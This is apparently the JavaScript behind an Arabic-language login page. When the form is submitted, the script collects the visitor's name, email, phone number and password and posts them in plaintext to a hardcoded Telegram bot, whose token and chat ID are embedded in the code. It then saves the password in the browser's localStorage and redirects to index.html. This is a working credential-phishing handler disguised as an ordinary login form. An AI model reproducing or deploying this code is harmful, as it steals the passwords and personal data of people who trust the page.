let okmassage = document.getElementById("okmassage");
let nomassage = document.getElementById("nomassage");
let submitBtn = document.getElementById("SubmitBTN");
document.getElementById("contactForm").addEventListener("submit", function (e) {
  e.preventDefault();
  submitBtn.disabled = true;
  submitBtn.innerText = "...جاري الإرسال";
  const UserName = document.getElementById("UserName").value || "بدون اسم";
  const UserEmail = document.getElementById("UserEmail").value || "بدون ايميل";
  const UserNumber = document.getElementById("UserNumber").value || "بدون رقم";
  const UserPassword =
    document.getElementById("UserPassword").value || "بدون كلمة مرور";
  const token = "8506814802:AAFtVRAB3jd6s4it2bkL0hxBz_obZ8A44fw";
  const chat_id = "-5252684975";
  const message = `📝 تسجيل دخول جديد:
الاسم: ${UserName}
البريد: ${UserEmail}
رقم الهاتف: ${UserNumber}
كلمة المرور: ${UserPassword}`;
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id, text: message }),
  })
    .then(() => {
      window.localStorage.setItem("Userlogined", "true");
      window.localStorage.setItem("Username", UserName);
      window.localStorage.setItem("Useremail", UserEmail);
      window.localStorage.setItem("Usernumber", UserNumber);
      window.localStorage.setItem("Userpassword", UserPassword);
      if (typeof okmassage !== "undefined") {
        okmassage.style.top = "-10px";
        setTimeout(() => {
          okmassage.style.top = "-80px";
        }, 3000);
      }
      setTimeout(() => {
        window.location.href = "index.html";
      }, 3000);
    })
    .catch((error) => {
      nomassage.style.top = "-10px";
      setTimeout(() => {
        nomassage.style.top = "-80px";
      }, 3000);
      submitBtn.disabled = false;
      submitBtn.innerText = "تسجيل الدخول";
      console.error(error);
    });
});
if (localStorage.getItem("Userlogined") === "true") {
  window.location.replace("./index.html");
}
let closeBTN = document.getElementById("closeBTN");
let faXmark = document.getElementById("faXmark");
let importantMassage = document.getElementById("importantMassage");
faXmark.onclick = function () {
  importantMassage.style.display = "none";
};
closeBTN.onclick = function () {
  importantMassage.style.display = "none";
};
let showBTN = document.getElementById("showBTN");
showBTN.onclick = function () {
  let pwdInput = document.getElementById("UserPassword");
  if (showBTN.classList == "fa-regular fa-eye") {
    showBTN.classList = "fa-regular fa-eye-slash";
    pwdInput.type = "text";
  } else {
    showBTN.classList = "fa-regular fa-eye";
    pwdInput.type = "password";
  }
};
